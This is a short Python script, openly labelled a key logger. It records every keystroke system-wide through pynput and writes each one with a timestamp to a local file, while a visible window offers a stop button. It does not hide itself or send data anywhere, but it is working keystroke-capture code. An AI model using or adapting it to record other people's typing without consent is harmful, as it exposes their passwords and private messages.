import time
from pynput import keyboard
import threading
import tkinter as tk
import os

# Deletes keylog.txt if it exists
if os.path.isfile("keylog.txt"):
    os.remove("keylog.txt")

# Function to handle the pressed key event
def on_press(key):
    global chars
    print(chars, end='\r')
    chars += 1
    with open('keylog.txt', 'a') as f:
        f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())[:-3]}: {key}\n')

# Function to stop recording and close the file
def end():
    global running
    running = False
    
    # Stop keylogging and wait for it to finish
    keylogging_thread.join()
    
    # Close the Tkinter window
    root.destroy()

chars = 0

# Create a thread for keylogging to run in background
running = True
def start_keylogging():
    with keyboard.Listener(on_press=on_press) as listener:
        while running:
            time.sleep(0.1)
        listener.stop()

# Set up the main window and stop button
root = tk.Tk()
root.title("Key Logger")

stop_button = tk.Button(root, text="Stop Logging", command=end)
stop_button.pack(pady=20)

# Start keylogging in a separate thread
keylogging_thread = threading.Thread(target=start_keylogging, daemon=True)
keylogging_thread.start()

# Run the tkinter main loop
root.mainloop()
